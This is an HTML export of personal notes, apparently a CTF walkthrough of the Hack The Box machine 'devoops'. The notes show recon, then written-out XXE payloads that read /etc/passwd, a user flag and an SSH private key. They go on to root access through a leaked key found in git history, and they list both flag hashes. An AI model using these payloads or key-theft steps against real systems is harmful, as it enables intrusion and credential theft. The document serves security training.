<!DOCTYPE html>
<html>
<head>
<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
<title>devoops</title>
<meta content="CherryTree" name="generator"/>
<link href="styles.css" rel="stylesheet" type="text/css"/>
</head>
<body><div class="main"><div class="tree">
<p><a href="HacktheBox--Linux_Boxes.html">Linux Boxes</a></p>
<p><a href="#devoops">devoops</a></p>
<ol>
<li><a href="#nmapAutomator.sh">nmapAutomator.sh</a></li>
<ol>
<li><a href="#recon">recon</a></li>
<ol>
<li><a href="#gobuster">gobuster</a></li>
<li><a href="#nikto">nikto</a></li>
</ol>
</ol>
<li><a href="#http (port 5000) gunicorn">http (port 5000) gunicorn</a></li>
<ol>
<li><a href="#/feed">/feed</a></li>
<li><a href="#/upload">/upload</a></li>
<ol>
<li><a href="#test.xml">test.xml</a></li>
</ol>
</ol>
<li><a href="#XML XXE Injection foothold">XML XXE Injection foothold</a></li>
<ol>
<li><a href="#payloadallthethings XXE">payloadallthethings XXE</a></li>
<li><a href="#/etc/password">/etc/password</a></li>
<li><a href="#leak user.txt">leak user.txt</a></li>
<li><a href="#/.ssh/id_rsa">/.ssh/id_rsa</a></li>
<li><a href="#ssh login">ssh login</a></li>
</ol>
<li><a href="#privesc">privesc</a></li>
<ol>
<li><a href="#LinEnum.sh">LinEnum.sh</a></li>
<li><a href="#roosa bash_history">roosa bash_history</a></li>
<li><a href="#git log">git log</a></li>
<ol>
<li><a href='#"reverted accidental commit " log'>"reverted accidental commit " log</a></li>
<li><a href="#git show">git show</a></li>
<ol>
<li><a href="#unknown id_rsa">unknown id_rsa</a></li>
</ol>
</ol>
<li><a href="#ssh to root">ssh to root</a></li>
</ol>
<li><a href="#user/root">user/root</a></li>
<li><a href="#lessons learned">lessons learned</a></li>
</ol></div>
<div class="page" id="devoops"><h1><b><u>devoops</u></b></h1><img alt="images/1421-1.png" src="images/1421-1.png"/>s<br/><img alt="images/1421-2.png" src="images/1421-2.png"/></div>
<div class="page" id="nmapAutomator.sh"><h1><b><u>nmapAutomator.sh</u></b></h1><img alt="images/1422-1.png" src="images/1422-1.png"/><br/><img alt="images/1422-2.png" src="images/1422-2.png"/><br/><img alt="images/1422-3.png" src="images/1422-3.png"/><br/><br/><br/></div>
<div class="page" id="recon"><h1><b><u>recon</u></b></h1>gobuster<br/>nikto</div>
<div class="page" id="gobuster"><h1><b><u>gobuster</u></b></h1><img alt="images/1424-1.png" src="images/1424-1.png"/><br/><br/><span style="color:#24ff00;">/feed <br/>/upload </span></div>
<div class="page" id="nikto"><h1><b><u>nikto</u></b></h1><img alt="images/1426-1.png" src="images/1426-1.png"/></div>
<div class="page" id="http (port 5000) gunicorn"><h1><b><u>http (port 5000) gunicorn</u></b></h1><span style="color:#24ff00;">todo is worth noting</span><br/><span style="color:#ffa500;">dev.solita.fi</span><br/><img alt="images/1425-1.png" src="images/1425-1.png"/><br/><br/>service is gunicorn, a python web server<br/><img alt="images/1425-2.png" src="images/1425-2.png"/></div>
<div class="page" id="/feed"><h1><b><u>/feed</u></b></h1><span style="color:#24ff00;">allthough this page looks like a webpage written in html, its just a </span><span style="color:#ffa500;">picture</span><br/><img alt="images/1427-1.png" src="images/1427-1.png"/></div>
<div class="page" id="/upload"><h1><b><u>/upload</u></b></h1><span style="color:#24ff00;">might be able to upload a </span><span style="color:#ffff00;">webshell</span><span style="color:#24ff00;"> here, lets check it out<br/></span><img alt="images/1428-1.png" src="images/1428-1.png"/></div>
<div class="page" id="test.xml"><h1><b><u>test.xml</u></b></h1><span style="color:#24ff00;">XML note in the upload page, lets try uploading a test.xml file</span><br/><br/><img alt="images/1429-1.png" src="images/1429-1.png"/><br/><span style="color:#24ff00;">the webpage is mentioning an </span><span style="color:#ffff00;">Author</span><span style="color:#24ff00;">, </span><span style="color:#ffff00;">Subject</span><span style="color:#24ff00;"> and </span><span style="color:#ffff00;">Content</span><span style="color:#24ff00;"> field in its BLOGPOST note, lets write an xml file that contain those parameters</span><br/><br/><span style="color:#ffa500;"><br/>&lt;?xml version="1.0"?&gt;<br/>&lt;test&gt;<br/>&lt;Author&gt;test&lt;/Author&gt;<br/>&lt;Subject&gt;test&lt;/Subject&gt;<br/>&lt;Content&gt;test&lt;/Content&gt;<br/>&lt;/test&gt;</span><br/><img alt="images/1429-2.png" src="images/1429-2.png"/><img alt="images/1429-3.png" src="images/1429-3.png"/></div>
<div class="page" id="XML XXE Injection foothold"><h1><b><u>XML XXE Injection foothold</u></b></h1><img alt="images/1431-1.png" src="images/1431-1.png"/></div>
<div class="page" id="payloadallthethings XXE"><h1><b><u>payloadallthethings XXE</u></b></h1><span style="color:#24ff00;">Check out payloadallthethings github link </span><a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20Injection">here</a> <br/><br/><img alt="images/1432-1.png" src="images/1432-1.png"/><br/><br/><br/><img alt="images/1432-2.png" src="images/1432-2.png"/><br/><img alt="images/1432-3.png" src="images/1432-3.png"/><br/><span style="color:#ffa500;">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE replace [&lt;!ENTITY example “Doe”&gt;]&gt;<br/>&lt;test&gt;<br/>&lt;Author&gt;test&lt;/Author&gt;<br/>&lt;Subject&gt;test&lt;/Subject&gt;<br/>&lt;Content&gt;test&lt;/Content&gt;<br/>&lt;/test&gt;<br/> </span><br/><br/><img alt="images/1432-4.png" src="images/1432-4.png"/><img alt="images/1432-5.png" src="images/1432-5.png"/><br/><br/><span style="color:#24ff00;"><br/>since the author entity is replaced with the string “Doe” we know our </span><span style="color:#ffa500;">XXE</span><span style="color:#24ff00;"> exploit is working as intended, lets see if we can leak some sensitive files next...</span><br/></div>
<div class="page" id="/etc/password"><h1><b><u>/etc/password</u></b></h1><img alt="images/1433-1.png" src="images/1433-1.png"/><br/><span style="color:#24ff00;">applying this vulnerability to our existing exploit we just have to update the </span><span style="color:#ffa500;">DOCTYPE</span><span style="color:#24ff00;"> variable:</span><br/><span style="color:#ffa500;">&lt;?xml version="1.0"?&gt;<br/>&lt;!DOCTYPE root [&lt;!ENTITY test SYSTEM ‘file:///etc/passwd’&gt;]&gt;<br/>&lt;test&gt;<br/>&lt;Author&gt;test&lt;/Author&gt;<br/>&lt;Subject&gt;test&lt;/Subject&gt;<br/>&lt;Content&gt;test&lt;/Content&gt;<br/>&lt;/test&gt;<br/> </span><br/><br/><img alt="images/1433-2.png" src="images/1433-2.png"/><img alt="images/1433-3.png" src="images/1433-3.png"/><br/><br/><span style="color:#24ff00;">the server response leaks </span><span style="color:#ffa500;">/etc/passwd</span><span style="color:#24ff00;">!</span><br/><span style="color:#24ff00;">further enumerating the server response shows us theres a user by the name of </span><span style="color:#ffff00;">roosa</span></div>
<div class="page" id="leak user.txt"><h1><b><u>leak user.txt</u></b></h1><span style="color:#24ff00;">we can leak </span><span style="color:#ffa500;">user.txt </span><span style="color:#24ff00;">by setting the system call's file to point towards </span><span style="color:#ffff00;">/home/roosa/user.txt</span><br/><img alt="images/1434-1.png" src="images/1434-1.png"/></div>
<div class="page" id="/.ssh/id_rsa"><h1><b><u>/.ssh/id_rsa</u></b></h1><span style="color:#24ff00;">lets see if we can leak the </span><span style="color:#ffff00;">ssh key</span><span style="color:#24ff00;"> by guessing to see if roosa has an id_rsa file in her the .ssh folder of her directory</span><br/><img alt="images/1435-1.png" src="images/1435-1.png"/><br/><br/><span style="color:#24ff00;">we have</span><span style="color:#ffff00;"> roosa's </span><span style="color:#24ff00;">private key!<br/>now we take that and save it to a file </span><span style="color:#ffff00;">id_rsa</span><span style="color:#24ff00;"> and give it proper permissions</span><br/><br/><img alt="images/1435-2.png" src="images/1435-2.png"/><br/><img alt="images/1435-3.png" src="images/1435-3.png"/><br/><br/><br/><br/><br/></div>
<div class="page" id="ssh login"><h1><b><u>ssh login</u></b></h1><span style="color:#24ff00;">we can log into </span><span style="color:#ffff00;">roosa's</span><span style="color:#24ff00;"> account with the rsa </span><span style="color:#ffff00;">key</span><span style="color:#24ff00;"> we leaked from the </span><span style="color:#ffa500;">XXE Entity</span><span style="color:#24ff00;"> attack</span><br/><br/><img alt="images/1437-1.png" src="images/1437-1.png"/></div>
<div class="page" id="privesc"><h1><b><u>privesc</u></b></h1>LinEnum.sh</div>
<div class="page" id="LinEnum.sh"><h1><b><u>LinEnum.sh</u></b></h1><img alt="images/1439-1.png" src="images/1439-1.png"/><h2><br/><br/></h2><img alt="images/1439-2.png" src="images/1439-2.png"/><br/><br/><img alt="images/1439-3.png" src="images/1439-3.png"/></div>
<div class="page" id="roosa bash_history"><h1><b><u>roosa bash_history</u></b></h1><span style="color:#24ff00;">we see there is a comment in </span><span style="color:#ffff00;">roosa's </span><span style="color:#ffa500;">bash_history</span><span style="color:#24ff00;"> log that notes a git upload footnote denotring that there was an accidental key commit that needed to be replaced, could that be </span><span style="color:#ffff00;">root's</span><span style="color:#24ff00;"> private key?</span><br/><br/><img alt="images/1440-1.png" src="images/1440-1.png"/><br/><br/></div>
<div class="page" id="git log"><h1><b><u>git log</u></b></h1><span style="color:#24ff00;">to look at the server's git hub upload history, use <br/></span><span style="color:#ffa500;">git log</span><span style="color:#24ff00;"><br/><br/></span><img alt="images/1441-1.png" src="images/1441-1.png"/><br/><img alt="images/1441-2.png" src="images/1441-2.png"/></div>
<div class="page" id='"reverted accidental commit " log'><h1><b><u>"reverted accidental commit " log</u></b></h1><span style="color:#24ff00;">We found the commit ID that pertains to the note we saw ealier in</span><span style="color:#ffff00;"> roosa's </span><span style="color:#ffa500;">bash_history,</span><span style="color:#24ff00;"> we can print the outputs of this commit with the ID<br/><br/></span><img alt="images/1442-1.png" src="images/1442-1.png"/><br/><br/><span style="color:#ffff00;">33e87c312c08735a02fa9c796021a4a3023129ad</span></div>
<div class="page" id="git show"><h1><b><u>git show</u></b></h1><span style="color:#24ff00;">to show the contents of the commit, use</span><br/><span style="color:#ffa500;">git show 33e87c312c08735a02fa9c796021a4a3023129ad</span><br/><img alt="images/1445-1.png" src="images/1445-1.png"/><br/><img alt="images/1445-2.png" src="images/1445-2.png"/><br/><img alt="images/1445-3.png" src="images/1445-3.png"/><br/><br/><span style="color:#24ff00;">lets paste it on our local machine and give it proper privileges</span><br/><img alt="images/1445-4.png" src="images/1445-4.png"/><br/><img alt="images/1445-5.png" src="images/1445-5.png"/><br/><br/></div>
<div class="page" id="unknown id_rsa"><h1><b><u>unknown id_rsa</u></b></h1><img alt="images/1446-1.png" src="images/1446-1.png"/><br/><span style="color:#24ff00;">troublesome ‘</span><span style="color:#ffa500;">-’</span><span style="color:#24ff00;">'s begin every line, use </span><span style="color:#ffa500;">:%s/-//g </span><span style="color:#24ff00;">to globally replace all of them</span><br/><span style="color:#24ff00;">where<br/></span><span style="color:#ffa500;">:%s/ </span><span style="color:#24ff00;">starts the replacement statement<br/></span><span style="color:#ffa500;">/-// </span><span style="color:#24ff00;">replaces - with nothing<br/></span><span style="color:#ffa500;">g</span><span style="color:#24ff00;"> is to issue the command globally</span><br/><img alt="images/1446-2.png" src="images/1446-2.png"/><br/><br/><img alt="images/1446-3.png" src="images/1446-3.png"/><br/><br/><span style="color:#ffa500;">/%s\-/ /g</span> <span style="color:#24ff00;">to remove all the dashes but don't use that here because itll mess with the BEGIN and END header and footer</span></div>
<div class="page" id="ssh to root"><h1><b><u>ssh to root</u></b></h1><span style="color:#ffa500;">ssh -i unknown_id_rsa 10.10.10.91</span><br/><img alt="images/1447-1.png" src="images/1447-1.png"/><br/><br/></div>
<div class="page" id="user/root"><h1><b><u>user/root</u></b></h1><img alt="images/1444-1.png" src="images/1444-1.png"/><span style="color:#ffff00;"><br/>c5808e1643e801d40f09ed87cdecc67b<br/><br/></span><img alt="images/1444-2.png" src="images/1444-2.png"/><br/>d4fe1e7f7187407eebdd3209cb1ac7b3</div>
<div class="page" id="lessons learned"><h1><b><u>lessons learned</u></b></h1><span style="color:#24ff00;">Check out Rana Khalil's OSCP writeups and prep at</span> <a href="https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/">https://rana-khalil.gitbook.io/hack-the-box-oscp-preparation/</a><br/><br/><img alt="images/1448-1.png" src="images/1448-1.png"/><br/><a href="https://docs.github.com/en/github/authenticating-to-github/removing-sensitive-data-from-a-repository">https://docs.github.com/en/github/authenticating-to-github/removing-sensitive-data-from-a-repository</a></div>
</div></body></html>